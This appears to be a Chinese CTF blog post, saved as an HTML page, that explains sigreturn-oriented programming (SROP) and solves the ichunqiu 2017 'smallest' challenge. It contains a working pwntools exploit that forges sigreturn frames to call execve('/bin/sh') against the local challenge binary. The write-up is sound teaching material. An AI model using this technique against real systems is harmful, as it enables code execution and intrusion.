@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <meta name="description" content="koocola&#39;s blog" />
+  
+
+  
+  
+  
+  
+  
+  
+  <title>SROP | koocola&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="恶意调用sigreturn引发的劫持">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SROP">
+<meta property="og:url" content="http://yoursite.com/2018/10/06/SROP/index.html">
+<meta property="og:site_name" content="koocola&#39;s blog">
+<meta property="og:description" content="恶意调用sigreturn引发的劫持">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-10-06T01:02:51.524Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SROP">
+<meta name="twitter:description" content="恶意调用sigreturn引发的劫持">
+  
+  
+    <link rel="icon" href="/css/images/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+</head>
+<body class="home blog custom-background custom-font-enabled single-author">
+  <div id="page" class="hfeed site">
+      <header id="masthead" class="site-header" role="banner">
+    <hgroup>
+      <h1 class="site-title">
+        <a href="/" title="koocola&#39;s blog" rel="home">koocola&#39;s blog</a>
+      </h1>
+      
+        <h2 class="site-description">
+          <a href="/" id="subtitle">不要用战术上的勤奋掩饰战略上的懒惰</a>
+        </h2>
+      
+    </hgroup>
+
+    <nav id="site-navigation" class="main-navigation" role="navigation">
+            <button class="menu-toggle">菜单</button>
+            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
+            <div class="menu-main-container">
+                <ul id="menu-main" class="nav-menu">
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
+                
+                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
+                
+                </ul>
+            </div>
+    </nav>
+</header>
+      <div id="main" class="wrapper">
+        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-SROP" class="post-SROP post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title article-title">
+      SROP
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/10/06/SROP/" data-id="cjmwqkggt000064tip45781bi" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>恶意调用sigreturn引发的劫持<br><a id="more"></a><br><strong>基本原理</strong><br>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核，然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal，当signal handler返回之后，内核为该进程恢复之前保存的上下文，最后恢复进程的执行。</p>
+<p>而内核保存上下文所用的方法是把所有的寄存器的值等信息全部push到栈中，然后在栈顶填上一个地址rt_sigreturn，这段地址的代码中会调用sigreturn函数。在内核态返回到用户态（ret）时，栈顶指针指向sigreturn函数，然后就会调用sigreturn函数把栈中保存的数据取出来恢复上下文。</p>
+<p>那么如果我们覆盖函数的返回地址为sigreturn再同时在其后面伪造上下文，那么sigreturn调用后，就会把我们伪造的值取出来，这样我们就可以实现劫持程序进程。</p>
+<p>SROP相对于ROP的优点就是不需要找那么多的gadget，只需要知道栈的地址，调用sigreturn的代码的地址，以及一个栈溢出漏洞就可以getshell.</p>
+<p><strong>这种攻击方法的经典例子就是ichunqiu 2017的smallest题：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br></pre></td></tr></table></figure></p>
+<p>这题总共就这么几行的代码<br>可以看出ROP是没法去做的，用SROP会很方便<br>知道有两种方法:<br>一种是用SROP直接调用execve(“/bin/sh”)来getshell<br>另一种是用SROP调用mprotect函数更改栈属性为可执行，再写入shellcode来getshell.<br>自己只尝试了第一种方法:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">f=process(&quot;./smallest&quot;)</span><br><span class="line">context.arch=&quot;amd64&quot;</span><br><span class="line">start_addr=0x4000b0</span><br><span class="line">need_addr=0x4000b3</span><br><span class="line">syscall=0x4000be</span><br><span class="line"></span><br><span class="line">payload=p64(start_addr)*3</span><br><span class="line">f.sendline(payload)</span><br><span class="line">log.info(&quot;1...!...1&quot;)</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">f.send(&quot;\xb3&quot;)</span><br><span class="line">stack_addr=u64(f.recv()[8:16])</span><br><span class="line">log.info(&quot;stack_addr:&quot;+hex(stack_addr))</span><br><span class="line"></span><br><span class="line">#payload=p64(need_addr)+7*&apos;a&apos;   #set rax=0xf &lt;--&gt;call sigreturn</span><br><span class="line">#f.send(payload)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rax=0</span><br><span class="line">frame.rdi=0</span><br><span class="line">frame.rsi=stack_addr</span><br><span class="line">frame.rdx=0x400</span><br><span class="line">frame.rsp=stack_addr</span><br><span class="line">log.info(&quot;length of frame is:&quot;+hex(len(frame)))</span><br><span class="line">payload=p64(start_addr)+p64(0)+str(frame)</span><br><span class="line">f.send(payload)</span><br><span class="line">time.sleep(1)</span><br><span class="line">payload=p64(syscall)+&quot;a&quot;*7</span><br><span class="line">f.send(payload)    #call read</span><br><span class="line">payload=p64(start_addr)*96+&quot;/bin/sh\0&quot;</span><br><span class="line">time.sleep(1)</span><br><span class="line">f.send(payload)   #set /bin/sh</span><br><span class="line">log.info(&quot;2...!...2&quot;)</span><br><span class="line">time.sleep(1)</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rip=syscall</span><br><span class="line">frame.rax=59</span><br><span class="line">frame.rdi=stack_addr+0x300</span><br><span class="line">frame.rsi=0</span><br><span class="line">frame.rdx=0</span><br><span class="line"></span><br><span class="line">f.send(p64(start_addr)+p64(0)+str(frame))</span><br><span class="line">f.send(p64(syscall)+&quot;a&quot;*7)</span><br><span class="line">log.info(&quot;3...!...3&quot;)</span><br><span class="line">f.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>参考了很多大佬的博客，大佬们真是太强了</p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/10/06/SROP/">
+    <time datetime="2018-10-06T00:29:20.000Z" class="entry-date">
+        2018-10-06
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+    
+<nav class="nav-single">
+    <h3 class="assistive-text">文章导航</h3>
+    
+    
+        <span class="nav-next"><a href="/2018/10/02/fastbin/" rel="next">IO_FILE劫持总结 <span class="meta-nav">→</span></a></span>
+    
+</nav><!-- .nav-single -->
+
+
+
+
+
+
+
+</div></div>
+        <div id="secondary" class="widget-area" role="complementary">
+  
+    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
+    <div>
+        <input type="text" value="" name="s" id="s" />
+        <input type="submit" id="searchsubmit" value="搜索" />
+    </div>
+</form></aside>
+  
+    
+  
+    
+  
+    
+  <aside class="widget">
+    <h3 class="widget-title">Recents</h3>
+    <div class="widget-content">
+      <ul>
+        
+          <li>
+            <a href="/2018/10/06/SROP/">SROP</a>
+          </li>
+        
+          <li>
+            <a href="/2018/10/02/fastbin/">IO_FILE劫持总结</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/30/death_note/">pwnable.tw death_note</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/24/pwn_build/">pwn环境的简单部署</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/24/odd/">零碎知识</a>
+          </li>
+        
+      </ul>
+    </div>
+  </aside>
+
+  
+    
+  
+    
+  
+</div>
+      </div>
+      <footer id="colophon" role="contentinfo">
+    <p>&copy; 2018 koocola
+    All rights reserved.</p>
+    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</footer>
+    <script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+<script src="/js/navigation.js"></script>
+
+<div id="bg"></div>
+
+  </div>
+</body>
+</html>
